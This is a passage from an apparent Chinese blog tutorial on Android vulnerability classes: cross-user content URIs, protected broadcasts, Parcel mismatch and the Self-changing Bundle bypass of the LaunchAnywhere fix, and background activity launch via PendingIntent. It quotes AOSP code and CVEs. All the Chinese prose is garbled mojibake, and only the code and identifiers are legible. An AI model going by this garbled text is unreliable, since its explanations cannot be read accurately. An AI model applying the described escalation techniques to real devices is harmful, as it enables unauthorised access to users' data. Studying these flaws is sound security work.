æ£€æŸ¥çš„æ¼æ´å…¶å®è¿˜æœ‰å¾ˆå¤šï¼Œæœ€è¿‘æ¯”è¾ƒå¤šçš„æ˜¯é«˜æƒé™åº”ç”¨ç¨‹åºæ¥æ”¶ URI æ—¶æ²¡æœ‰æ£€æŸ¥è¯¥ URI æ˜¯å¦æŒ‡å‘å…¶ä»–ç”¨æˆ·ï¼Œä»è€Œå…è®¸ä¸€ä¸ªç”¨æˆ·è¶Šæƒè¯»å–åˆ°å¦ä¸€ä¸ªç”¨æˆ·çš„åª’ä½“ã€‚content URI æ­£å¸¸æ ¼å¼ä¸º content://host:port/path/idï¼Œè·¨ç”¨æˆ·çš„ content URI ä¼šåœ¨ host å‰é¢åŠ ä¸Šç”¨æˆ· IDï¼Œå½¢å¦‚ content://10@host:port/path/idã€‚å¹¿æ’­æƒé™ä¸ä¿æŠ¤å¹¿æ’­ä¸Šæ–‡ä¸­è¯´åˆ°å››å¤§ç»„ä»¶éƒ½å¯ä»¥å®šä¹‰æƒé™ï¼Œé™åˆ¶åªèƒ½æœ‰å¯¹åº”æƒé™çš„ä¸ªä½“è®¿é—®ï¼Œä½†å…¶å®å¯¹äºå¹¿æ’­æ¥è¯´ï¼Œå®ƒè¿˜æœ‰é¢å¤–çš„ä¿æŠ¤æœºåˆ¶ã€‚æˆ‘ä»¬å¸¸ç”¨çš„ BOOT_COMPLETED ç­‰å¹¿æ’­éƒ½æ˜¯åªæœ‰ç³»ç»Ÿèƒ½å‘é€ï¼Œå¦‚æœåº”ç”¨å‘é€äº†è¿™ç§å¹¿æ’­ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿç­”æ¡ˆæ˜¯ä¼šè¢«ç³»ç»Ÿæ‹’ç»å‘é€ã€‚è¿™ä¸€ç³»åˆ—çš„å¹¿æ’­å¯¹ç³»ç»Ÿæä¸ºé‡è¦ï¼Œå¦‚æœç¬¬ä¸‰æ–¹åº”ç”¨å¯ä»¥éšæ„å‘é€ï¼Œæ¯”å¦‚å‘é€ android.intent.action.REBOOTï¼Œç³»ç»Ÿå°±é‡å¯äº†ï¼›å‘é€ android.intent.action.MASTER_CLEARï¼Œç³»ç»Ÿå°±ä¼šå¼€å§‹æ¢å¤å‡ºå‚è®¾ç½®ã€‚å½“æ—¶ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸€ç§æ–¹æ³•æ˜¯é™åˆ¶æ‰€æœ‰çš„ç³»ç»Ÿå¹¿æ’­æ¥æ”¶å™¨å¿…é¡»åŠ ä¸Šæƒé™ï¼Œåªæœ‰æ‹¥æœ‰ç³»ç»Ÿæƒé™æ‰èƒ½è®¿é—®ï¼Œä½†æ˜¯éš¾æçš„æ˜¯ï¼Œè¿™äº›å¹¿æ’­ä¸­æœ‰ä¸€äº›æ˜¯ç²˜æ€§å¹¿æ’­ï¼ˆsticky broadcastsï¼‰ï¼Œå®ƒåœ¨ç³»ç»Ÿä¸­ä¼šé•¿æ—¶é—´å­˜ç•™ï¼Œç›´åˆ°åä¸€ä¸ªè¦†ç›–å‰ä¸€ä¸ªï¼Œè¿™æ ·åº”ç”¨ä»ç„¶æœ‰æœºä¼šè¦†ç›–ç²˜æ€§å¹¿æ’­çš„æ•°æ®ï¼›å¦ä¸€ä¸ªé€‰æ‹©æ˜¯ï¼Œç»™è¿™äº›å¹¿æ’­éƒ½å®šä¹‰ä¸Šæƒé™ï¼Œåªæœ‰æœ‰æƒé™çš„ä¸ªä½“æ‰èƒ½å‘é€ï¼Œä½†æ˜¯ç»™è¿™äº›å¹¿æ’­ä¸€ä¸ªä¸€ä¸ªå®šä¹‰ä¸“ç”¨æƒé™æ˜¾ç„¶ä¸ç°å®ï¼Œäºæ˜¯ä¿æŠ¤å¹¿æ’­ä¾¿è¯ç”Ÿäº†ï¼Œè¿˜æ˜¯é™åˆ¶åªæœ‰ç³»ç»Ÿèƒ½å‘é€ï¼Œä½†æ˜¯æ²¡æœ‰åƒä¼ ç»Ÿä¸€æ ·å®šä¹‰ç‰¹åˆ«çš„æƒé™ã€‚å¾ˆæ˜¾ç„¶ï¼Œè¿™ä¹ˆå¤šå±é™©çš„å¹¿æ’­ï¼Œå¦‚æœæœ‰ä¸€ä¸ªè¢«æ¼æ‰å¿˜è®°è¢«ä¿æŠ¤ï¼Œæˆ–è€…å®šä¹‰ä¿æŠ¤å¹¿æ’­æ²¡æœ‰ç”Ÿæ•ˆï¼Œå°±ä¼šå‡ºç°ä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚äº‹å®ä¸Šï¼Œå†å²ä¸Šç¡®å®å‘ç”Ÿè¿‡ç±»ä¼¼çš„æ¼æ´ï¼šCVE-2017-0601 å’Œ CVE-2020-0391ã€‚å¦å¤–ä¸€ç‚¹ï¼Œç³»ç»Ÿå†…éƒ¨ä¹Ÿå¤§é‡åº”ç”¨äº†å¹¿æ’­æœºåˆ¶ä¼ é€’ä¿¡æ¯ï¼Œå¹¿æ’­è¿™ç©æ„å’Œ Activity Service Provider éƒ½ä¸åŒï¼Œä¸€æ¬¡å¹¿æ’­å¯èƒ½è¢«å¤šä¸ªä¸ªä½“æ¥æ”¶ï¼Œå¦‚æœè¯´ç³»ç»Ÿå†…éƒ¨å‘é€å¹¿æ’­ä¼ é€’å†…éƒ¨ä¿¡æ¯çš„æ—¶å€™æ²¡æœ‰æŒ‡å®šæ¥æ”¶è€…ï¼Œé‚£å°±æœ‰å¯èƒ½è¢«ç¬¬ä¸‰æ–¹åº”ç”¨æ‹¿åˆ°æ•æ„Ÿä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¸å¯èƒ½æŠŠæ‰€æœ‰å·²çŸ¥ä¼šæ¥æ”¶è¿™ä¸ªå¹¿æ’­çš„å¯ä¿¡åº”ç”¨ç¡¬ç¼–ç åœ¨ä»£ç é‡Œï¼Œç”±æ­¤å°±å¼•å…¥äº†å¦ä¸€ä¸ªå®‰å…¨æœºåˆ¶ï¼Œä¸ä»…å¹¿æ’­æ¥æ”¶è€…å¯ä»¥æŒ‡å®šè¦æœ‰æŸæŸæƒé™æ‰èƒ½ç»™æˆ‘å‘å¹¿æ’­ï¼Œå‘é€è€…ä¹Ÿå¯ä»¥æŒ‡å®šæ¥æ”¶è€…å¿…é¡»æœ‰æŸæŸæƒé™æ‰èƒ½æ”¶åˆ°å¹¿æ’­ï¼Œåˆ©ç”¨ç°æœ‰çš„æƒé™æœºåˆ¶è§£å†³äº†é—®é¢˜ã€‚è¿™é‡Œå¯èƒ½å‡ºç°çš„æ¼æ´å°±æ˜¯å†™ä»£ç çš„äººç²—å¿ƒå¤§æ„å¿˜è®°æŒ‡å®šæƒé™ï¼Œå¯¼è‡´ä¿¡æ¯è¢«å…¶ä»–ä¸ç›¸å…³åº”ç”¨æ¥æ”¶ã€‚ï¼ˆé¢˜å¤–è¯ï¼Œå…¶å®éšå¼ intent å¯åŠ¨ Activity ä¹Ÿæœ‰å¯èƒ½å‡ºç°ç±»ä¼¼é—®é¢˜ï¼Œä¸‰æ–¹åº”ç”¨å®šä¹‰ä¸€ä¸ªç›¸åŒçš„ intent-filter å°±æœ‰æœºä¼šè¢«ç³»ç»Ÿå¯åŠ¨ï¼Œä¸è¿‡è¿™ç§æ¼æ´åå°‘ï¼Œå¯åŠ¨ activity åªä¼šå¯åŠ¨ä¸€ä¸ªï¼Œå¯ä»¥é€šè¿‡åœ¨ intent-filter é…ç½®å¤§äº 0 çš„ä¼˜å…ˆçº§æ¥è§£å†³ã€‚ä¸è¿‡ä¹Ÿä¸æ˜¯æ²¡æœ‰ï¼ŒCVE-2020-0396ï¼‰ã€‚Parcel Mismatchå…¶å®è¿™ä¸€æ®µä¸åº”è¯¥æ”¾åœ¨ç»„ä»¶ä¸æ„å›¾çš„ï¼Œä½†æ˜¯çœŸçš„ä¸çŸ¥é“è¯¥æ”¾å“ªã€‚é™¤äº†ä¼ ç»Ÿçš„ Java åºåˆ—åŒ–æ–¹æ³•ï¼Œandroid è¿˜ä¸ºè·¨è¿›ç¨‹é€šä¿¡ä¸“é—¨è®¾è®¡äº†ä¸€å¥—è½»é‡çº§çš„åºåˆ—åŒ–æ–¹æ¡ˆï¼šParcelableã€‚å’Œ Serializable ä¸åŒï¼Œä½¿ç”¨ Parcelable è¦æ±‚å¼€å‘è€…æ‰‹åŠ¨å¾€ parcel å†™å…¥æˆ–è¯»å–æ•°æ®ã€‚ä»¥ä¸‹å±•ç¤ºäº†ä¸€ä¸ªå…¸å‹çš„ Parcelable å®ç°ç±»ï¼š12345678910111213141516171819202122232425262728public class Person implements Parcelable &#123; private String name; private int age; private int money; public static final Creator&lt;Person&gt; CREATOR = new Creator&lt;Person&gt;() &#123; @Override public Person createFromParcel(Parcel in) &#123; Person obj = new Person(); obj.name = in.readString(); obj.age = in.readInt(); obj.money = in.readInt(); return obj; &#125; @Override public Person[] newArray(int size) &#123; return new Person[size]; &#125; &#125;; @Override public int describeContents() &#123; return 0; &#125; @Override public void writeToParcel(@NonNull Parcel dest, int flags) &#123; dest.writeString(name); dest.writeInt(age); dest.writeInt(money); &#125;&#125;å‡å¦‚è¿™é‡Œç¨‹åºå‘˜æ‰‹æ»‘äº†ï¼Œwrite å†™å…¥çš„æ•°æ®å’Œ read è¯»å–çš„æ•°æ®ä¸åŒ¹é…ï¼Œæ¯”å¦‚è¯´ä¸€è¾¹å†™äº† long å¦ä¸€åŠè¯»äº† int æˆ–è€…å¿˜è®°è¯»æŸä¸ªå­—æ®µï¼Œä¼šå‘ç”Ÿä»€ä¹ˆé—®é¢˜å—ï¼ŸæŸ¥çœ‹ä»¥ä¸Šä»£ç ï¼Œä¸¤æ¬¡ readInt è°ƒç”¨åŒä¸€ä¸ªæ–¹æ³•èƒ½è¯»å–åˆ°ä¸åŒçš„æ•°æ®ï¼Œè€Œä¸”è¯»å–é¡ºåºå’Œå†™å…¥é¡ºåºå®Œå…¨ç›¸åŒï¼Œè¿™è¯´æ˜ Parcel å†…éƒ¨å¿…å®šå­˜åœ¨ç€ä¸€ä¸ªåç§»å€¼ï¼Œæ¯æ¬¡ read è¯»å–å½“å‰åç§»çš„æ•°æ®ç„¶åè‡ªå¢åç§»ã€‚å‡å¦‚ read æ²¡æœ‰å®Œå…¨æ¶ˆè´¹å®ƒå†™å…¥çš„æ‰€æœ‰å€¼ï¼Œé‚£ä¹ˆ parcel ä¸­æ®‹ç•™çš„å€¼å¯èƒ½ä¼šå½±å“åç»­å€¼çš„è§£æã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡å¦‚æœ‰å¦‚ä¸‹ aidl å‡½æ•°å®šä¹‰ï¼š1void registerPerson(Person person, int flags);å‡å¦‚ Person ä¸­æœ€åä¸€è¡Œ obj.money = in.readInt() ç¼ºå¤±äº†ï¼Œé‚£ä¹ˆ Person å¯¹è±¡ååºåˆ—åŒ–å®Œä¹‹åï¼Œè¿˜ä¼šæœ‰ä¸€ä¸ª int æ®‹ç•™åœ¨ parcel å†…ï¼Œæ¥ä¸‹æ¥å°è¯•è¯»å– flags è°ƒç”¨ readInt æ—¶å®é™…ä¸Šè¯»å–åˆ°çš„æ˜¯ Person æ®‹ç•™çš„ money è€Œä¸æ˜¯æ­£ç¡®çš„ flagsã€‚å†å›è¿‡å¤´æ¥çœ‹ä¸€ä¸‹ä¹‹å‰ LaunchAnywhere æ¼æ´ï¼Œå½“æ—¶çš„ä¿®å¤è¡¥ä¸æ˜¯ï¼Œauthenticator è¿”å› intent å AccountManagerService æ£€æŸ¥ intent è¦è°ƒèµ·çš„ activity çš„åŒ…çš„ç­¾åæ˜¯å¦ä¸ authenticator è‡ªèº«åŒ¹é…ï¼ŒåŒ¹é…æ‰å‘é€ç»™è°ƒç”¨è€…è®©å®ƒæ‰“å¼€ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹ï¼Œauthenticator è¿”å›çš„æ•°æ®ç±»å‹å®é™…ä¸Šæ˜¯ Bundleï¼Œintent ä¹Ÿæ˜¯æ”¾è¿› bundle é‡Œå­˜å‚¨çš„ã€‚Bundle è¿™é‡Œå¯ä»¥ç®€å•ç†è§£ä¸ºä¸€ä¸ª mapï¼Œå­˜å‚¨ç€é”®å€¼å¯¹ï¼Œé‡Œé¢å€¼çš„ç±»å‹é™¤äº†å¯ä»¥æ˜¯åŸºæœ¬ç±»å‹å’Œ Stringï¼Œè¿˜å¯ä»¥æ˜¯ä»»æ„ Parcelable å¯¹è±¡ã€‚è¿™ä¸¤ç‚¹ç»“åˆèµ·æ¥ï¼Œä¼šç¢°æ’å‡ºæ€æ ·çš„ç«èŠ±å‘¢ï¼Ÿæ³¨æ„ä¸Šé¢æ£€æŸ¥ bundle æ˜¯åœ¨ AccountManagerService ä¸­ï¼Œå®ƒåœ¨ system_server ä¸­è¿è¡Œï¼Œè€Œå®é™…è°ƒèµ· activity çš„æ“ä½œåœ¨è°ƒç”¨è€…è¿›ç¨‹ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œ bundle ä» system_server åˆ° app è¿˜è¦ç»è¿‡ä¸€æ¬¡åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚æˆ‘ä»¬å·²ç»çŸ¥é“ bundle æ˜¯ä¸€ä¸ª map ä¸”å¯ä»¥å­˜å‚¨ä»»æ„ Parcelable å¯¹è±¡ï¼Œé‚£å‡å¦‚æˆ‘ä»¬åœ¨ bundle ä¸­ä»»æ„æ”¾ä¸€ä¸ªååºåˆ—åŒ–é”™ä½çš„å¯¹è±¡ï¼Œå°±æœ‰æœºä¼šæ±¡æŸ“å®ƒåé¢çš„é”®å€¼å¯¹ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ å†…å­˜å¸ƒå±€ï¼Œæˆ‘ä»¬ç”šè‡³èƒ½è®© AccountManagerService æ£€æŸ¥æ—¶æ‰¾ä¸åˆ° intentï¼Œè€Œç»è¿‡ä¸€æ¬¡åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¼ è¾“åˆ° app åå´èƒ½æ‰¾åˆ° intentï¼Œç»•è¿‡ LaunchAnywhere æ¼æ´çš„ä¿®å¤ï¼ç”±äº Bundle æ¥å—ä»»æ„ Parcelableï¼Œæ‰€ä»¥å®é™…ä¸Šä»»ä½•æœ‰é—®é¢˜çš„ Parcelable éƒ½èƒ½æ‹¿æ¥è¿™æ ·åˆ©ç”¨ï¼è¿™ç§æŠ€æœ¯æœ‰ä¸€ä¸ªç‰¹åˆ«çš„åå­—ï¼Œå« Self-changing Bundleã€‚2023 å¹´å›½å†…æŸç”µå•†è½¯ä»¶å¤§è‚†åœ¨é‡åˆ©ç”¨çš„å…¶ä¸­ä¸€ä¸ªæ¼æ´ CVE-2023-20963 å°±å±äºæ­¤ç±»æ¼æ´ã€‚è·å¾—äº†ä»¥ç³»ç»Ÿæƒé™å¯åŠ¨ä»»æ„ Activity çš„èƒ½åŠ›åï¼Œå¯ä»¥åˆ©ç”¨ç³»ç»Ÿå†…éƒ¨ä¸€äº› activity çš„ intent redirectionï¼Œè®¾ç½® data å’Œ flags æ‹¿åˆ°å†…éƒ¨ content provider å¦‚ä¸€äº› file provider çš„è¯»å†™æƒé™ï¼Œå¯ä»¥è¶Šæƒè¯»å†™ç³»ç»Ÿå…³é”®æ–‡ä»¶ï¼Œæ”¹å†™ç³»ç»Ÿé…ç½®ï¼›å¦ä¸€ç§åˆ©ç”¨æ–¹æ¡ˆæ˜¯æ”»å‡»å…¶ä»–åº”ç”¨æœªå¯¼å‡ºçš„ç»„ä»¶ï¼Œè¯»å†™åº”ç”¨å†…éƒ¨æ•°æ®ç”šè‡³å‘å…¶ä»–åº”ç”¨æ³¨å…¥æ¶æ„ä»£ç ã€‚ç”±äº Google å·²ç»æ„è¯†åˆ°è¿™ç±»æ¼æ´çš„å¼ºå¤§ç ´ååŠ›ï¼Œåœ¨ Android 13 ä¸­å¼•å…¥äº†å¤šä¸ªæœºåˆ¶ç¼“è§£æ­¤ç±»æ¼æ´ï¼Œå¦‚ Lazy Bundle å’Œ Parcel.enforceNoDataAvail()ã€‚å¦å¤– Google åœ¨ AccountManagerService å¼•å…¥äº†ä¸€ä¸ªæ–°çš„ checkKeyIntentParceledCorrectly å‡½æ•°ï¼Œæ ¡éªŒ bundle ä¸­çš„ intent ååºåˆ—åŒ–å‰åæ˜¯å¦ä¸€è‡´ï¼Œå¹¶æŠŠè¯¥è¡¥ä¸ä¸€è·¯å‘ä¸‹ backport åˆ°äº† Android 11ï¼Œç®—æ˜¯åŸºæœ¬å°æ­»äº†è¿™ç±»åˆ©ç”¨ bundle çš„æ–¹æ³•ã€‚æ›´å¤šå…³äºè¿™ç±»æ¼æ´çš„ç»†èŠ‚ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹æ–‡ç« ï¼šAndroid ååºåˆ—åŒ–æ¼æ´æ”»é˜²å²è¯Creator MismatchClang è£ç¼åº—ï¼šLaunchAnyWhere è¡¥ä¸ç»•è¿‡ï¼šAndroid Bundle Mismatch ç³»åˆ—æ¼æ´ å¤ç°ä¸åˆ†æåŒæ—¶å¼ºçƒˆå»ºè®®æŸ¥çœ‹ MichaÅ‚ Bednarski çš„ GitHub ä¸»é¡µï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯ parcel mismatch ç±»æ¼æ´ä¸”æ¯ä¸€ä¸ªéƒ½æœ‰å¾ˆè¯¦ç»†çš„ writeupã€‚ç»„ä»¶å¯åŠ¨çš„åå°é™åˆ¶Android ç³»ç»Ÿå¯¹åœ¨åå°è¿è¡Œçš„åº”ç”¨æ–½åŠ ä¸¥æ ¼é™åˆ¶ï¼Œå¦‚æœåº”ç”¨æœ‰åŠæ³•ç»•è¿‡è¿™äº›é™åˆ¶ï¼Œå°±å¯èƒ½è¢«è§†ä¸ºå®‰å…¨æ¼æ´ã€‚æœ¬èŠ‚æˆ‘ä»¬ä¸»è¦å…³æ³¨ä»¥ä¸‹é™åˆ¶ï¼šä»åå°å¯åŠ¨ activity çš„é™åˆ¶ä»åå°å¯åŠ¨å‰å°æœåŠ¡çš„é™åˆ¶åŒæ—¶æˆ‘ä»¬å®šä¹‰ä»¥ä¸‹ç¼©å†™ï¼šBALï¼šBackground activity launchï¼Œç»•è¿‡ä¸Šé¢çš„ç¬¬ä¸€ä¸ªé™åˆ¶BG-FGSï¼šBackground-Foreground Service startï¼Œç»•è¿‡ä¸Šé¢çš„ç¬¬äºŒä¸ªé™åˆ¶WIUï¼šwhile-in-use æƒé™ï¼Œç®€ç§°å‰å°æƒé™ï¼ŒæŒ‡ç”¨æˆ·ä»…å…è®¸åº”ç”¨â€œåœ¨ä½¿ç”¨ä¸­æ‰èƒ½è·å¾—â€çš„æƒé™æ¶æ„åº”ç”¨åˆ©ç”¨ BAL æ¼æ´å¯ä»¥åœ¨åå°éšæ„å¼¹å‡ºå¹¿å‘Šï¼Œä¸¥é‡å½±å“ç”¨æˆ·å¯¹æ‰‹æœºçš„æ­£å¸¸ä½¿ç”¨ã€‚èƒ½å¤Ÿç»•è¿‡ BAL é™åˆ¶çš„æ¼æ´ä¸€èˆ¬è‡³å°‘éƒ½ä¼šè¢«æˆäºˆ High ç­‰çº§ï¼Œè€Œè™½ç„¶ç»•è¿‡ BG-FGS é™åˆ¶å¹¶ä¸è¢«ç›´æ¥è§†ä¸ºæ˜¯å®‰å…¨æ¼æ´ï¼Œä½†å¦‚æœèƒ½ä»åå°è·å– WIU æƒé™ï¼Œä»ç„¶ä¼šè¢«è®¤ä¸ºæ˜¯é«˜å±ã€‚éƒ¨åˆ†æ­¤ç±»æ¼æ´å…·æœ‰ç›¸ä¼¼çš„æ¨¡å¼ï¼Œä»è¿‘å‡ ä¸ªæœˆçš„å®‰å…¨å¹¿å‘Šæ¥çœ‹ä¹Ÿç¡®å®æ¯éš”ä¸€ä¸¤ä¸ªæœˆéƒ½æœ‰ç±»ä¼¼æ¼æ´å‡ºç°ã€‚æœ¬èŠ‚æˆ‘ä»¬ä¸»è¦ä»‹ç»åˆ©ç”¨ PendingIntent å®ç° BALã€‚ä»¥ Android 14 ä¸ºä¾‹ï¼Œç³»ç»Ÿåˆ¤æ–­ BAL æ˜¯å¦è¢«å…è®¸çš„é€»è¾‘åœ¨ BackgroundActivityStartController.checkBackgroundActivityStart() é‡Œï¼Œåˆ¤æ–­æ˜¯å¦èƒ½å¯åŠ¨å‰å°æœåŠ¡çš„é€»è¾‘åˆ™åœ¨ ActiveServices.canStartForegroundServiceLocked()ã€‚ä»¥ BAL ä¸ºä¾‹ï¼Œæˆ‘ä»¬è¿™é‡Œå°±ä¸åˆ†æå®Œæ•´åˆ¤æ–­é€»è¾‘äº†ï¼Œå®åœ¨æ˜¯å¤ªé•¿äº†ï¼Œè¯¦ç»†åˆ†æç»å¯¹ä¸æ˜¯è¿™é‡Œèƒ½å†™å®Œçš„ã€‚æˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™ä¸€å°æ®µï¼š1234567891011121314151617181920212223242526272829// Legacy behavior allows to use caller foreground state to bypass BAL restriction.// The options here are the options passed by the sender and not those on the intent.final BackgroundStartPrivileges balAllowedByPiSender = PendingIntentRecord.getBackgroundStartPrivilegesAllowedByCaller( checkedOptions, realCallingUid, realCallingPackage);final boolean logVerdictChangeByPiDefaultChange = checkedOptions == null || checkedOptions.getPendingIntentBackgroundActivityStartMode() == ComponentOptions.MODE_BACKGROUND_ACTIVITY_START_SYSTEM_DEFINED;final boolean considerPiRules = logVerdictChangeByPiDefaultChange || balAllowedByPiSender.allowsBackgroundActivityStarts();final String verdictLogForPiSender = balAllowedByPiSender.allowsBackgroundActivityStarts() ? VERDICT_ALLOWED : VERDICT_WOULD_BE_ALLOWED_IF_SENDER_GRANTS_BAL;@BalCode int resultIfPiSenderAllowsBal = BAL_BLOCK;if (realCallingUid != callingUid &amp;&amp; considerPiRules) &#123; resultIfPiSenderAllowsBal = checkPiBackgroundActivityStart(callingUid, realCallingUid, backgroundStartPrivileges, intent, checkedOptions, realCallingUidHasAnyVisibleWindow, isRealCallingUidPersistentSystemProcess, verdictLogForPiSender);&#125;if (resultIfPiSenderAllowsBal != BAL_BLOCK &amp;&amp; balAllowedByPiSender.allowsBackgroundActivityStarts() &amp;&amp; !logVerdictChangeByPiDefaultChange) &#123; // The result is to allow (because the sender allows BAL) and we are not interested in // logging differences, so just return. return resultIfPiSenderAllowsBal;&#125;å¦‚æœè°ƒç”¨è€…å®é™…ä¸Šä¸æ˜¯è‡ªå·± startActivityï¼Œè€Œæ˜¯å‘é€äº†ç”±å…¶ä»– UID åˆ›å»ºçš„ PendingIntent ï¼ˆæˆ– IntentSenderï¼Œå®é™…ä¸Šæ˜¯ PendingIntent å†…éƒ¨å®ç°ï¼‰ï¼Œåˆ™ realCallingUid != callingUid ä¼šæˆç«‹ï¼Œç„¶åä¼šè°ƒç”¨ checkPiBackgroundActivityStartï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344private @BalCode int checkPiBackgroundActivityStart(int callingUid, int realCallingUid, BackgroundStartPrivileges backgroundStartPrivileges, Intent intent, ActivityOptions checkedOptions, boolean realCallingUidHasAnyVisibleWindow, boolean isRealCallingUidPersistentSystemProcess, String verdictLog) &#123; final boolean useCallerPermission = PendingIntentRecord.isPendingIntentBalAllowedByPermission(checkedOptions); if (useCallerPermission &amp;&amp; ActivityManager.checkComponentPermission( android.Manifest.permission.START_ACTIVITIES_FROM_BACKGROUND, realCallingUid, -1, true) == PackageManager.PERMISSION_GRANTED) &#123; return logStartAllowedAndReturnCode(BAL_ALLOW_PENDING_INTENT, /*background*/ false, callingUid, realCallingUid, intent, \"realCallingUid has BAL permission. realCallingUid: \" + realCallingUid, verdictLog); &#125; // don't abort if the realCallingUid has a visible window // TODO(b/171459802): We should check appSwitchAllowed also if (realCallingUidHasAnyVisibleWindow) &#123; return logStartAllowedAndReturnCode(BAL_ALLOW_PENDING_INTENT, /*background*/ false, callingUid, realCallingUid, intent, \"realCallingUid has visible (non-toast) window. realCallingUid: \" + realCallingUid, verdictLog); &#125; // if the realCallingUid is a persistent system process, abort if the IntentSender // wasn't allowed to start an activity if (isRealCallingUidPersistentSystemProcess &amp;&amp; backgroundStartPrivileges.allowsBackgroundActivityStarts()) &#123; return logStartAllowedAndReturnCode(BAL_ALLOW_PENDING_INTENT, /*background*/ false, callingUid, realCallingUid, intent, \"realCallingUid is persistent system process AND intent \" + \"sender allowed (allowBackgroundActivityStart = true). \" + \"realCallingUid: \" + realCallingUid, verdictLog); &#125; // don't abort if the realCallingUid is an associated companion app if (mService.isAssociatedCompanionApp( UserHandle.getUserId(realCallingUid), realCallingUid)) &#123; return logStartAllowedAndReturnCode(BAL_ALLOW_PENDING_INTENT, /*background*/ false, callingUid, realCallingUid, intent, \"realCallingUid is a companion app. \" + \"realCallingUid: \" + realCallingUid, verdictLog); &#125; return BAL_BLOCK;&#125;å¦‚æœ realCallingUid å³ PendingIntent/IntentSender çš„å‘é€è€…æ‹¥æœ‰å¯è§çª—ä½“ï¼Œæˆ–è€…æ˜¯éœ€è¦æŒç»­è¿è¡Œçš„ç³»ç»Ÿé‡è¦è¿›ç¨‹ï¼Œé‚£ä¹ˆå°±æœ‰æœºä¼šè¢«å…è®¸ã€‚å¸¸è§çš„æ˜¯å¾ˆå¤š OEM åœ¨ system uid çš„è¿›ç¨‹ä¸­å®ç°æ‰‹åŠ¿å¯¼èˆªç­‰è‡ªå®šä¹‰åŠŸèƒ½ï¼Œå¯¼è‡´ç³»ç»Ÿè®¤ä¸º system uid å…·æœ‰å¯è§çª—å£ï¼Œæš´éœ²æ”»å‡»é¢ã€‚è€Œç³»ç»Ÿä¸­æœ‰å¾ˆå¤šæ¥æ”¶ PendingIntent/IntentSender çš„æ¥å£ï¼Œä¸€èˆ¬ç”¨äºå¼‚æ­¥æ“ä½œå®Œæˆåå‘è°ƒç”¨è€…å‘é€è¿”å›å€¼ï¼Œå¦‚æœå¿˜è®°åœ¨ options å†…æŒ‡å®šå‚æ•°ç¦æ­¢ BALï¼Œé‚£å°±æœ‰å¯èƒ½è¢«æˆ‘ä»¬åˆ©ç”¨ã€‚ä»¥ CVE-2023-21081 &amp; CVE-2023-21099 ä¸ºä¾‹ï¼Œç³»ç»Ÿä¸­ PackageManager å¤šä¸ª API æ¥å—ä¸€ä¸ª IntentSender ä½œä¸ºå›è°ƒæ¥å£ï¼Œè€Œå‘é€è¯¥ IntentSender æ—¶æ²¡æœ‰æŒ‡å®š options å¯¼è‡´å…¶ä¸ºé»˜è®¤çš„ nullã€‚è§£å†³æ–¹æ³•å°±æ˜¯åŠ ä¸€ä¸ª options å¹¶ä¸” setPendingIntentBackgroundActivityLaunchAllowed(false)ã€‚è¿™é‡Œæœ‰ä¸€ç‚¹ï¼ŒAndroid 14 ä¸­å¯¹ BAL é™åˆ¶åšå‡ºäº†ä¸€äº›å¢å¼ºï¼Œå…¶ä¸­ â€œåº”ç”¨ä¼šæ”¶åˆ°æ¥è‡ªå…¶ä»–å¯è§åº”ç”¨å‘é€çš„ PendingIntentâ€ ä¸€é¡¹ä¸­åŠ äº†ä¸€ä¸ªå¯¹æˆ‘ä»¬å¾ˆé‡è¦çš„é™åˆ¶ï¼šNote: Starting from Android 14, apps targeting Android 14 or higher must opt in to allow background activity launch when sending a PendingIntent. To opt in, the app should pass an ActivityOptions bundle with setPendingIntentBackgroundActivityStartMode(ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)getDefaultBackgroundStartPrivileges åœ¨ options ä¸ºç©ºæ—¶è¿”å›çš„é»˜è®¤å€¼ä¹Ÿæœ‰æ›´æ”¹ï¼Œå¯èƒ½ä¸å…è®¸ BALï¼š1234567891011121314151617181920public static BackgroundStartPrivileges getDefaultBackgroundStartPrivileges( int callingUid, @Nullable String callingPackage) &#123; if (UserHandle.getAppId(callingUid) == Process.SYSTEM_UID) &#123; // We temporarily allow BAL for system processes, while we verify that all valid use // cases are opted in explicitly to grant their BAL permission. // Background: In many cases devices are running additional apps that share UID with // the system. If one of these apps targets a lower SDK the change is not active, but // as soon as that app is upgraded (or removed) BAL would be blocked. (b/283138430) return BackgroundStartPrivileges.ALLOW_BAL; &#125; boolean isChangeEnabledForApp = callingPackage != null ? CompatChanges.isChangeEnabled( DEFAULT_RESCIND_BAL_PRIVILEGES_FROM_PENDING_INTENT_SENDER, callingPackage, UserHandle.getUserHandleForUid(callingUid)) : CompatChanges.isChangeEnabled( DEFAULT_RESCIND_BAL_PRIVILEGES_FROM_PENDING_INTENT_SENDER, callingUid); if (isChangeEnabledForApp) &#123; return BackgroundStartPrivileges.ALLOW_FGS; &#125; else &#123; return BackgroundStartPrivileges.ALLOW_BAL; &#125;&#125;å†åŠ ä¸Šå¤§éƒ¨åˆ†è¿™ç§æ¼æ´éƒ½å·²ç»è¢«æŒ–å®Œäº†ï¼Œè¿™ç§æ¼æ´åœ¨ 2024 å¹´ä¹‹ååŸºæœ¬åœ¨ AOSP ä¸­ç»è¿¹ã€‚æƒ³è¦äº†è§£æ›´å¤šçš„è¯ï¼Œå¯ä»¥æŸ¥çœ‹ OPPO çš„è¿™ç¯‡æ–‡ç« ï¼šæ¶æ„ App åå°å¼¹çª—æŠ€æœ¯æ‰‹æ³•åˆ†æéª—ï¼å·è¢­ï¼ä¸è®²æ­¦å¾·ï¼ä¸Šé¢ä»‹ç»äº†å¾ˆå¤šæŠ€æœ¯æ¼æ´ï¼Œè¿™ä¸€èŠ‚ä»äººå‡ºå‘ï¼Œä»‹ç»å‡ ä¸ªåŸç†å¾ˆç®€å•æœ´ç´ 